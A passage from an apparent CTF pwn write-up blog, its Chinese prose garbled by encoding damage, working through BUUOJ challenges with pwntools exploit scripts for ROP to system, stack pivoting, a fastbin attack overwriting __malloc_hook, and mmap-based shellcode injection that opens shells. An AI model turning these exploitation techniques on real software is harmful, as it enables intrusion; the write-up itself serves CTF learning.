class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>dest</code>å­—ç¬¦ä¸²åœ¨æ ˆä¸Š æ‰€ä»¥<code>src</code>è¶…è¿‡<code>dest</code>é•¿åº¦çš„éƒ¨åˆ†ä¼šè¢«å¤åˆ¶åœ¨æ ˆä¸Šå¯¼è‡´æ ˆæº¢å‡º è¿™é‡Œæ„é€ ROPçš„æ€è·¯æ˜¯ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­ç”¨åˆ°çš„<code>system()</code>é…åˆå­—ç¬¦ä¸²<code>fflush</code>åä¸¤ä¸ªå­—ç¬¦<code>sh</code>æ¥get shell ä½†æ˜¯å®æ“çš„æ—¶å€™å‘ç°å¦‚æœè¦åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´çš„è¯ä¼šè¦†ç›–ä¸€ä¸ªåªåœ¨ä¸»å‡½æ•°å¼€å¤´åˆå§‹åŒ–çš„è¡¨å¤´æŒ‡é’ˆ(ebx)</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-103602.png" alt="image-20240708103555476"></p>
<p>å¦‚æœè¢«æ— æ³•è§£å¼•ç”¨çš„4bytesæ•°æ®è¦†ç›–çš„è¯ç¨‹åºä¼šç›´æ¥åœ¨<code>puts()</code>å°±æŠ¥é”™ç„¶ååœæ­¢ è€Œè¡¨å¤´çš„åœ°å€æ˜¯<code>0x804A000</code> ç”¨æ¥æ„é€ payloadçš„<code>scanf</code>å‡½æ•°ä¼šåœ¨ç©ºæ ¼(\x20), æ¢è¡Œ(\x0A), å­—ç¬¦ä¸²ç»“æŸç¬¦(\x00)å¤„åœæ­¢è¾“å…¥ æ— æ³•åšåˆ°ä¸æ›´æ”¹ä¿å­˜ebxæ ˆç©ºé—´çš„æ ˆæº¢å‡º æ‰€ä»¥è¿™é‡Œè¿”å›åœ°å€ä¸èƒ½é€‰ä¸ºè°ƒç”¨<code>getflag()</code>çš„ä¸‹ä¸€è¡Œçš„åœ°å€ è€Œæ˜¯<code>exit()</code></p>
<p>æ„é€ å¦‚ä¸‹payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_got = p32(elf.got[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">system_plt = p32(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">exit_plt = p32(elf.plt[<span class="string">&#x27;exit&#x27;</span>])</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x4C</span></span><br><span class="line">binsh = p32(<span class="number">0x80482EA</span>)</span><br><span class="line"></span><br><span class="line">payload = padding + system_plt+ exit_plt + binsh + p32(<span class="number">0</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;administrator\x00&#x27;</span>)</span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;info:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ä¸€äº›è¿·æ€"><a href="#ä¸€äº›è¿·æ€" class="headerlink" title="ä¸€äº›è¿·æ€"></a>ä¸€äº›è¿·æ€</h3><p>ä¸€å¼€å§‹å°è¯•è¿‡ä½¿ç”¨ret2libcçš„æ–¹æ³•åœ¨libcä¸­å¯»æ‰¾<code>/bin/sh</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh.sendline(<span class="string">b&#x27;administrator\x00&#x27;</span>)</span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x4C</span></span><br><span class="line">payload1 = padding + puts_plt + ret_main + system_got + exit_plt + main_arg + p32(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;info:&#x27;</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(sh.recvline())</span><br><span class="line">line = sh.recvline()</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line">system_addr = u32(line[-<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;system&#x27;</span>, system_addr)</span><br><span class="line">libc_base = system_addr - libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>ç»“æœputsè¾“å‡ºçš„å†…å®¹æ˜¯<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-113408.png" alt="image-20240708113408269"></p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-113611.png" style="zoom:50%;" />

<p>æ˜¾ç„¶ä¸æ­¢è¾“å‡ºäº†systemçš„åœ°å€ ç›®å‰è¿˜æ²¡ææ‡‚ä¸ºä»€ä¹ˆ å¸Œæœ›ä»¥åèƒ½ææ˜ç™½</p>
<h4 id="23-7-16"><a href="#23-7-16" class="headerlink" title="23&#x2F;7&#x2F;16"></a>23&#x2F;7&#x2F;16</h4><p>è²Œä¼¼æ˜¯å› ä¸ºgotè¡¨ä¸ä¸€å®šç›´æ¥è·³è½¬åˆ°å†…å­˜ä¸­çš„åº“å‡½æ•° å‰é¢è¿˜æœ‰ä¸€äº›æŒ‡ä»¤</p>
<h2 id="BUUOJ-ciscn-2019-es-2-æ ˆè¿ç§»"><a href="#BUUOJ-ciscn-2019-es-2-æ ˆè¿ç§»" class="headerlink" title="BUUOJ-ciscn_2019_es_2 | æ ˆè¿ç§»"></a>BUUOJ-ciscn_2019_es_2 | æ ˆè¿ç§»</h2><p>åªå¼€äº†NX åŸºæœ¬ä¸Šä¸ç”¨è€ƒè™‘æ‰§è¡Œshellcodeäº† ç›´æ¥çœ‹æ¼æ´å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æº¢å‡ºçš„éƒ¨åˆ†æœ€å¤šåªåˆ°Callerâ€™s EBPå’ŒRetaddr å°±ç®—åŸç¨‹åºåŠ è½½äº†<code>system()</code>ä¹Ÿä¸å¤Ÿä¼ å…¥å‚æ•° ä¸ºäº†æ‰©å±•å¯ç”¨çš„æ ˆç©ºé—´å°±è¦ç”¨åˆ°<strong>æ ˆè¿ç§»</strong>æŠ€æœ¯ </p>
<h3 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h3><p>å‡½æ•°è¿”å›æ—¶æ‰§è¡Œçš„leaveå’ŒretæŒ‡ä»¤å®é™…ä¸Šæ˜¯å‡ ä¸ªæŒ‡ä»¤çš„é›†åˆ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave _ mov esp,ebp</span><br><span class="line">     |_ pop ebp</span><br><span class="line">ret   _ pop eip</span><br></pre></td></tr></table></figure>

<p>ebpæ˜¯ç”¨äºå­˜æ”¾è°ƒç”¨è€…ebpçš„åœ°å€çš„é”šç‚¹ è€Œä»leaveæŒ‡ä»¤å®é™…çš„ä¸¤æ¡æŒ‡ä»¤å¯ä»¥çœ‹å‡º ebpå’Œespæ˜¯å®Œå…¨å¯ä»¥äº’ç›¸å½±å“çš„ ä»è€Œeipä¹Ÿèƒ½è¢«ebpæ§åˆ¶ä»¥è¾¾åˆ°æŒæ¡æ§åˆ¶æµçš„ç›®çš„:<code>EBP &lt;--&gt; ESP --&gt; EIP</code></p>
<p>ä»¥è¿™ä¸€é¢˜ä¸ºä¾‹å­ ç”¨ç¼“å†²åŒºé¦–åœ°å€<code>buf_addr - 4</code>è¦†ç›–Callerâ€™s EBP å†ç”¨leaveæŒ‡ä»¤çš„åœ°å€è¦†ç›–è¿”å›åœ°å€ è¿™æ ·å†æ¬¡æ‰§è¡Œleaveæ—¶espå°±ä¼šè¢«æ–°é”šç‚¹éª—åˆ°ç¼“å†²åŒºä¸Š å†æ‰§è¡Œretæ—¶å°±ä¼šå°†ç¼“å†²åŒºä¸Šçš„ç›®æ ‡åœ°å€é€å…¥eip ç›¸å½“äºå¹³æ—¶çš„æ ˆæº¢å‡ºçš„éƒ¨åˆ†æ‰©å±•åˆ°ç¼“å†²åŒºçš„éƒ¨åˆ† å®ç°æ ˆè¿ç§»</p>
<p>è€Œè¦å®ç°æ ˆè¿ç§»åˆ°æ–°çš„æ ˆåœ°å€ä¸Šæœ€å°‘éœ€è¦ä¸€æ¬¡æ³„éœ²æ ˆåœ°å€ è¿™é¢˜åˆšå¥½æä¾›äº†<code>printf()</code>å’Œä¸¤æ¬¡è¾“å…¥</p>
<p>è®¡ç®—å‡ºCallerâ€™s ebpçš„åœ°å€è·ç¦»<code>buf_addr - 4</code>çš„å­—èŠ‚æ•°åå°±èƒ½æ„é€ å¦‚ä¸‹çš„payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">system = p32(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">leav_ret = p32(<span class="number">0x80485FC</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">msg = sh.recvuntil(<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line">ebp = u32(msg[-<span class="number">4</span>:]) - <span class="number">0x3C</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line">binsh_addr = ebp + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = system + <span class="string">b&#x27;AAAA&#x27;</span> + p32(binsh_addr) + bin_sh</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x28</span> - <span class="built_in">len</span>(payload)) + p32(ebp) + leav_ret</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-babyheap-0ctf-2017-å †æº¢å‡º-Use-after-free"><a href="#BUUOJ-babyheap-0ctf-2017-å †æº¢å‡º-Use-after-free" class="headerlink" title="BUUOJ-babyheap_0ctf_2017 | å †æº¢å‡º | Use after free"></a>BUUOJ-babyheap_0ctf_2017 | å †æº¢å‡º | Use after free</h2><p>å‰ç½®çŸ¥è¯† : <a href="https://wiki.wgpsec.org/knowledge/ctf/basicheap.html">https://wiki.wgpsec.org/knowledge/ctf/basicheap.html</a></p>
<p>ç›´æ¥çœ‹ä¸»å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 *chunks; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  chunks = (__int64 *)sub_56219BC00B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( get_num() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        alloc(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        fill(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        free_0(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        dump(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®è¾“å…¥è¿›è¡Œæ“ä½œ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> - ç”³è¯·ä¸€ä¸ªå † è®°å½•åœ¨ç¨‹åºè‡ªå·±çš„ç»“æ„ä½“chunksä¸­ chunksä¸­è®°å½•chunksæ˜¯å¦åœ¨ä½¿ç”¨, Size, Chunk</span><br><span class="line"><span class="number">2</span> - é€‰æ‹©ä¸€ä¸ªchunkç¼–è¾‘å…¶dataåŒºåŸŸ</span><br><span class="line">    æ­¤å¤„å­˜åœ¨å †æº¢å‡º ç¼–è¾‘ä¸€ä¸ªchunkçš„æ•°æ®æ—¶æ²¡æœ‰æ£€æµ‹å¤§å° å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„æ•°æ®</span><br><span class="line"><span class="number">3</span> - é‡Šæ”¾ä¸€ä¸ªchunk</span><br><span class="line"><span class="number">3</span> - æ ¹æ®chunksä¸­çš„Sizeæ˜¾ç¤ºä¸€ä¸ªchunkçš„æ•°æ®</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨ç¬¬nä¸ªchunkç¼–è¾‘ç¬¬n+1ä¸ªchunkçš„headeræ¥è®©å…¶sizeè¶³å¤Ÿè¦†ç›–ç¬¬n+2ä¸ªchunk å½“ç¬¬n+2ä¸ªchunkè¢«é‡Šæ”¾è¿›<code>unsorted bin</code>æ—¶é€šè¿‡n+1æ¥æ˜¾ç¤ºn+2ä¸­å‚¨å­˜çš„<code>fd</code>å’Œ<code>bk</code>çš„å€¼ å› ä¸º<code>unsorted bin</code>ä¸­åªæœ‰å®ƒä¸€ä¸ªchunk, <code>fd</code>å’Œ<code>bk</code>éƒ½æŒ‡å‘<code>main_arena + offset</code> æ®æ­¤å¯ä»¥æ³„éœ²libcçš„åŸºå€ ç„¶åå†é€šè¿‡æ„é€ fake chunkæ¥è¿›è¡Œä»»æ„åœ°å€å†™ è¦†ç›–<code>__malloc_hook</code>æŒ‡é’ˆ ä½¿å…¶å˜ä¸ºæˆ‘ä»¬æ‰¾åˆ°çš„one gadget æ­¤æ—¶å†ç”³è¯·å †æ—¶å°±ä¼šè§¦å‘åŸæœ¬åº”è¯¥è§¦å‘<code>__malloc_hook</code>çš„one gadget</p>
<h3 id="å…·ä½“æ€è·¯"><a href="#å…·ä½“æ€è·¯" class="headerlink" title="å…·ä½“æ€è·¯"></a>å…·ä½“æ€è·¯</h3><p>å…ˆä½¿ç”¨<a href="https://github.com/bash-c/main_arena_offset/blob/master/main_arena">å·¥å…·</a>æ‰¾åˆ°åé¢è¦ç”¨çš„main_arenaåœ¨libcä¸­çš„åœ°å€:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F15%2F20241015-202523.png" alt="image-20241015202428887"></p>
<p>å†ç”¨<a href="https://github.com/david942j/one_gadget">å¦ä¸€ä¸ªå·¥å…·</a>æ‰¾åˆ°libcä¸­å­˜åœ¨çš„one gadget:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F15%2F20241015-203101.png" alt="image-20241015203101596"></p>
<h4 id="è¦†ç›–chunk1çš„header"><a href="#è¦†ç›–chunk1çš„header" class="headerlink" title="è¦†ç›–chunk1çš„header"></a>è¦†ç›–chunk1çš„header</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">fill(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xB1</span>))</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹æ‰chunk1çš„headerä¸­çš„<code>size</code>å­—æ®µå¹¶é‡Šæ”¾chunk1å ä¸‹æ¬¡å†åˆ†é…0xA0(+ 0x10(headeré•¿åº¦) | 1(<code>P</code>æ ‡å¿—ä½) &#x3D;&#x3D; 0xB1)å¤§å°çš„chunkæ—¶ä¼šå› ä¸ºæ£€æµ‹åˆ°<code>fast bin</code>ä¸­æœ‰å¯¹åº”å¤§å°çš„chunkè€Œç›´æ¥åˆ†é…åˆ°åŸæ¥chunk1çš„ä½ç½®</p>
<p>è¿™é‡Œåˆ›å»ºchunk3çš„ç›®çš„æ˜¯é˜²æ­¢chunk2åœ¨åç»­é‡Šæ”¾æ—¶ç›´æ¥è¢«åˆ’å…¥<code>top chunk</code></p>
<h4 id="ä½¿ç”¨è¦†ç›–chunk2çš„chunk1æ³„éœ²libc-base"><a href="#ä½¿ç”¨è¦†ç›–chunk2çš„chunk1æ³„éœ²libc-base" class="headerlink" title="ä½¿ç”¨è¦†ç›–chunk2çš„chunk1æ³„éœ²libc base"></a>ä½¿ç”¨è¦†ç›–chunk2çš„chunk1æ³„éœ²libc base</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0xA0</span>) <span class="comment"># 1</span></span><br><span class="line">fill(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">3</span> * <span class="number">8</span> + p64(<span class="number">0x91</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">data = dump(<span class="number">1</span>)</span><br><span class="line">base = <span class="built_in">int</span>.from_bytes(data[:data.index(<span class="string">b&#x27;\x7f&#x27;</span>) + <span class="number">1</span>][-<span class="number">6</span>:], <span class="string">&#x27;little&#x27;</span>) - (main_arena + <span class="number">0x58</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;libc_base = <span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹chunk1è¿›è¡Œç¼–è¾‘å¹¶ä¸”è¦†ç›–chunk2çš„åŸå› æ˜¯ç¨‹åº<code>calloc()</code>åˆ†é…chunkä¼šåˆå§‹åŒ–dataä¸º{0}éœ€è¦ä¿®å¤chunk2çš„chunk header</p>
<h4 id="è¦†ç›–chunk2çš„fdå­—æ®µä¼ªé€ fake-chunk"><a href="#è¦†ç›–chunk2çš„fdå­—æ®µä¼ªé€ fake-chunk" class="headerlink" title="è¦†ç›–chunk2çš„fdå­—æ®µä¼ªé€ fake chunk"></a>è¦†ç›–chunk2çš„fdå­—æ®µä¼ªé€ fake chunk</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget = base + one[<span class="number">1</span>]</span><br><span class="line">malloc_hook = base + so.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">fkfd = malloc_hook - <span class="number">0x23</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">fill(<span class="number">1</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">3</span> * <span class="number">8</span> + p64(<span class="number">0x71</span>) + p64(fkfd))</span><br></pre></td></tr></table></figure>

<p>è¦†ç›–å‰:</p>
<p><code>(0x60 bytes)Fast bin -&gt; chunk2</code></p>
<p>è¦†ç›–å:</p>
<p><code>(0x60 bytes)Fast bin -&gt; chunk2 -&gt; fake chunk</code></p>
<p>å†ç”³è¯·ä¸¤ä¸ªsizeå‡ä¸º0x60çš„chunkå°±èƒ½è·å–åˆ°å¯¹fake chunk ä¹Ÿå°±æ˜¯<code>__malloc_hook</code>æ‰€åœ¨å†…å­˜åŒºåŸŸè¿›è¡Œå†™çš„èƒ½åŠ›äº†</p>
<p>è¿™é‡Œfake fdé€‰æ‹©åœ¨ - 0x23åç§»çš„åŸå› æ˜¯fastbinåœ¨åˆ†é…chunkçš„æ—¶å€™ä¼šæ£€æµ‹chunkçš„<code>P</code>æ ‡å¿—ä½ è€Œ - 0x23ä½ç½®å¯¹åº”çš„chunk <code>P</code>æ ‡å¿—ä½æ‰€åœ¨å­—èŠ‚æ˜¯bâ€™\x7fâ€™ æœ€ä½ä½æ˜¯1 ç¬¦åˆäº†fastbinåˆ†é…chunkçš„æ¡ä»¶</p>
<h4 id="è¦†ç›–-malloc-hook"><a href="#è¦†ç›–-malloc-hook" class="headerlink" title="è¦†ç›–__malloc_hook"></a>è¦†ç›–__malloc_hook</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">fill(<span class="number">4</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 5</span></span><br></pre></td></tr></table></figure>

<p>ç”³è¯·chunk5æ—¶ç¨‹åºå°±ä¼šè°ƒç”¨åŸæœ¬åº”è¯¥æ˜¯<code>__malloc_hook</code>çš„one gadgetè¾¾æˆget shell</p>
<h2 id="BUUOJ-inndy-rop-é™æ€ç¼–è¯‘pwn"><a href="#BUUOJ-inndy-rop-é™æ€ç¼–è¯‘pwn" class="headerlink" title="BUUOJ-inndy_rop | é™æ€ç¼–è¯‘pwn"></a>BUUOJ-inndy_rop | é™æ€ç¼–è¯‘pwn</h2><p>å¦‚æœæ‹¿åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯é™æ€ç¼–è¯‘å‡ºæ¥çš„ åŸºæœ¬ä¸Šä¸å¯èƒ½åº”ç”¨ret2libc å› ä¸ºlibcå°±åœ¨ç¨‹åºçš„.textæ®µä¸­ ä¸€äº›èƒ½å¤Ÿget shellçš„å‡½æ•°è‚¯å®šä¹Ÿä¼šè¢«ä¿®æ”¹ä»è€Œä¸èƒ½ä½¿ç”¨ è¿™æ—¶å€™å°±éœ€è¦åˆ©ç”¨å…¶ä»–çš„é£é™©å‡½æ•°å°è¯•ret2sehllcode é€šå¸¸è¿™ä¸ªé£é™©å‡½æ•°æ˜¯<code>mmap()</code>æˆ–è€…<code>mprotec()</code></p>
<p>ä»¥ä¸‹æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°åˆ†åˆ«ç”¨æ¥ç”³è¯·å¯æ‰§è¡Œå†…å­˜çš„æ–¹æ³•</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROT_READ       0x1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROT_WRITE      0x2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROT_EXEC       0x4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROT_NONE       0x0</span></span><br><span class="line">mmap(shellcode_addr, <span class="number">0x1000</span>uLL, PROT_READ | PROT_WRITE | PROT_EXEC, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>)</span><br><span class="line">mprotect(shellcode_addr, page_size, PROT_READ | PROT_WRITE | PROT_EXEC)</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜åªé™åˆ¶äº†<code>system()</code> ç›´æ¥ç»™å‡ºäº†æº¢å‡ºç‚¹ æ²¡æœ‰å…¶ä»–é™åˆ¶:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BYTE *<span class="title function_">overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">12</span>]; <span class="comment">// [esp+Ch] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ€è·¯å°±æ˜¯ç”³è¯·ä¸€å—å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ç„¶å<code>read()</code>å†™å…¥shellcodeå†ret2shellcode:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26480</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;127.0.0.1&#x27;, 20000)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">mmap_addr = elf.symbols[<span class="string">&#x27;mmap&#x27;</span>]</span><br><span class="line">overflow = elf.symbols[<span class="string">&#x27;overflow&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sehllcode_addr = p32(<span class="number">0xCCBB000</span>)</span><br><span class="line">lenth = p32(<span class="number">0x1000</span>)</span><br><span class="line">prot = p32(<span class="number">7</span>)</span><br><span class="line">flags = p32(<span class="number">0x22</span>)</span><br><span class="line">fd = p32(<span class="number">0xffffffff</span>)</span><br><span class="line">offset = p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">padding = (<span class="number">0xc</span> + <span class="number">4</span>) * <span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload1 = padding + p32(mmap_addr) + p32(overflow) + sehllcode_addr + lenth + prot + flags + fd + offset</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload2 = padding + p32(read_addr) + sehllcode_addr + p32(<span class="number">0</span>) + sehllcode_addr + p32(<span class="built_in">len</span>(shellcode))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-ZJCTF-2019-EasyHeap-Fastbin-Attack"><a href="#BUUOJ-ZJCTF-2019-EasyHeap-Fastbin-Attack" class="headerlink" title="BUUOJ-[ZJCTF 2019]EasyHeap | Fastbin Attack"></a>BUUOJ-[ZJCTF 2019]EasyHeap | Fastbin Attack</h2><p>å’Œä¸Šä¸€ä¸ªå †é¢˜çš„çŸ¥è¯†ç‚¹åŸºæœ¬ä¸Šä¸€æ · ç”šè‡³å¯ä»¥è¯´æ›´ç®€å• ä½†æ˜¯è¿˜æ˜¯å­¦åˆ°äº†æ–°ä¸œè¥¿æ‰€ä»¥è®°å½•ä¸€ä¸‹</p>
<p>æŸ¥çœ‹æ®µçš„æƒé™:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F27%2F20241027-223034.png" alt="image-20241027223027361"></p>
<p>å‘ç°gotè¡¨å¯å†™</p>
<p>ä¸»å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, 